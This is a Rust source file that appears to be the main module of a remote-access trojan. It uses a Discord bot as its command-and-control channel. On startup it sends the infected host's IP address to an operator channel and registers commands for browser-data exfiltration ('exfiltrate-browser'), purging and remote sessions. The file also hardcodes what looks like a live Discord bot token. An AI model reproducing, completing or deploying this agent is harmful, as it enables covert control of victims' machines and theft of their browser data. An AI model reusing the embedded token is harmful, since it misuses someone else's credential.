mod commands;
mod errors;
mod os;
mod utils;

use anyhow::Error;

use crate::commands::*;

use crate::commands::sessions::{exit, session};
use crate::utils::agent::get_or_create_agent;

use serenity::{
    async_trait,
    model::{
        application::{
            command::Command,
            interaction::{Interaction, InteractionResponseType, application_command::ApplicationCommandInteraction},
        },
        gateway::Ready,
        id::GuildId,
    },
    prelude::*,
};

const GUILD_ID: GuildId = GuildId(1086423448454180905);
static TOKEN: &str = "MTA4NzQ2MzExMjY3ODA1NTkzNg.GTGs1y.Nj49dYvo8rSYUA1duIUgaC57UhbJs5fJyMKvhU";

async fn register_commands(ctx: &Context) -> Result<(), Error> {
    Command::create_global_application_command(&ctx.http, info::register).await?;
    Command::create_global_application_command(&ctx.http, purge::register).await?;
    Command::create_global_application_command(&ctx.http, exfiltrate::register).await?;
    Command::create_global_application_command(&ctx.http, session::register).await?;
    Ok(())
}

async fn send_agent_check_in(ctx: &Context) -> Result<(), Error> {
    let agent = get_or_create_agent(ctx).await;

    agent
        .get_command_channel()
        .send_message(ctx, |m| {
            m.content(format!("Agent checking in from {}", agent.get_ip_address()))
        })
        .await?;
    Ok(())
}

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);

        register_commands(&ctx)
            .await
            .expect("Error registering commands.");
        send_agent_check_in(&ctx)
            .await
            .unwrap_or_else(|e| eprintln!("Error sending message: {:?}", e));
    }

    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
        if let Interaction::ApplicationCommand(command) = interaction {
            println!("Received command interaction: {:#?}", command);
            handle_command_interaction(&ctx, command).await;
        }
    }
}

async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandInteraction) {
    let agent = get_or_create_agent(ctx).await;

    if command.channel_id == *agent.get_command_channel() {
        let content = match command.data.name.as_str() {
            "info" => info::run(&command.channel_id, agent),
            "purge" => {
                if let Err(why) = handle_purge(ctx, &command).await {
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            "exfiltrate-browser" => {
                if let Err(why) = handle_exfiltrate(ctx, &command).await {
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            "session" => {
                if let Err(why) = handle_session(ctx, &command).await {
                    println!("Error handling session: {:?}", why);
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            _ => "The command has not been implemented within the commands channel.".to_string(),
        };

        handle_error(ctx, &command, content).await;
    } else if command.channel_id == agent.get_session_channel().unwrap() {
        let content = match command.data.name.as_str() {
            "exit" => {
                exit::run(&ctx).await.expect("TODO: panic message");
                return;
            }
            _ => "That command is not supported for command sessions.".to_string(),
        };
        handle_error(ctx, &command, content).await;
    }
}

async fn ephemeral_interaction_create(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
    content: &str,
) -> Result<(), Error> {
    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| message.content(content).ephemeral(true))
        })
        .await?;
    Ok(())
}

async fn handle_error(ctx: &Context, command: &ApplicationCommandInteraction, content: String) {
    if let Err(why) = command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| message.content(&content))
        })
        .await
    {
        println!("Cannot respond to slash command: {}", why);
    }
}

#[tokio::main]
async fn main() {
    let mut client = Client::builder(TOKEN, GatewayIntents::default())
        .event_handler(Handler)
        .await
        .expect("Failed to create the client");

    // start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("An error occurred while running the client: {:?}", why);
    }
}
